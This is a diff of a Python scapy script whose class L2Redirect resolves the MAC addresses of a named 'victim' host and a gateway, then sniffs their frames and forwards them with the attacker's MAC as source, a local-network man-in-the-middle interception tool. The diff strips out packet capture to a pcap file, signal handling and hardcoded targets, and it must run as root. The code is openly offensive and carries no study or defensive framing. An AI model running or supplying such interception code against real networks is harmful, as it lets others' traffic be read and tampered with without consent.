@@ -1,25 +1,18 @@
 #!/usr/bin/env python3
 import sys
-import signal
 import os
-from scapy.all import conf, get_if_hwaddr, srp, Ether, ARP, sendp, sniff, RawPcapWriter
+from scapy.all import conf, get_if_hwaddr, srp, Ether, ARP, sendp, sniff
 
-IFACE = "wlan0"
-VICTIM = "192.168.1.50"
-GATEWAY = "192.168.1.1"
-PCAP_PATH = None
 
 class L2Redirect:
-    def __init__(self, iface, victim_ip, gateway_ip, pcap_path=None):
+    def __init__(self, iface, victim_ip, gateway_ip):
         conf.iface = iface
         self.iface = iface
         self.victim_ip = victim_ip
         self.gateway_ip = gateway_ip
-        self.pcap_path = pcap_path
         self.attacker_mac = get_if_hwaddr(self.iface)
         self.victim_mac = None
         self.gateway_mac = None
-        self.packets = []
 
     def resolve_mac(self, ip, timeout=2):
         arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
@@ -45,8 +38,6 @@ class L2Redirect:
                 eth.dst = self.gateway_mac
                 eth.src = self.attacker_mac
                 sendp(eth, iface=self.iface, verbose=0)
-                if self.pcap_path:
-                    self.packets.append(bytes(eth))
                 return
             except Exception as e:
                 print(e)
@@ -55,8 +46,6 @@ class L2Redirect:
                 eth.dst = self.victim_mac
                 eth.src = self.attacker_mac
                 sendp(eth, iface=self.iface, verbose=0)
-                if self.pcap_path:
-                    self.packets.append(bytes(eth))
                 return
             except Exception as e:
                 print(e)
@@ -65,32 +54,18 @@ class L2Redirect:
         bpf = f"(ether src {self.victim_mac}) or (ether src {self.gateway_mac})"
         sniff(iface=self.iface, prn=self.forward_packet, filter=bpf, store=0)
 
-    def stop(self):
-        if self.pcap_path and self.packets:
-            try:
-                pcap_writer = RawPcapWriter(self.pcap_path, append=False, sync=True)
-                for raw in self.packets:
-                    pcap_writer.write(raw)
-            except Exception:
-                pass
-
-def signal_handler(sig, frame, redirector):
-    redirector.stop()
-    sys.exit(0)
-
-def main(IFACE, VICTIM, GATEWAY, PCAP_PATH=None):
+def main(IFACE, VICTIM, GATEWAY):
     if os.geteuid() != 0:
         print("must run as root")
         sys.exit(1)
 
-    r = L2Redirect(IFACE, VICTIM, GATEWAY, PCAP_PATH)
+    r = L2Redirect(IFACE, VICTIM, GATEWAY)
     try:
         r.setup()
     except Exception as e:
         print(f"setup failed: {e}")
         sys.exit(1)
 
-    signal.signal(signal.SIGINT, lambda s, f: signal_handler(s, f, r))
     r.start_sniffing()
 
 if __name__ == "__main__":
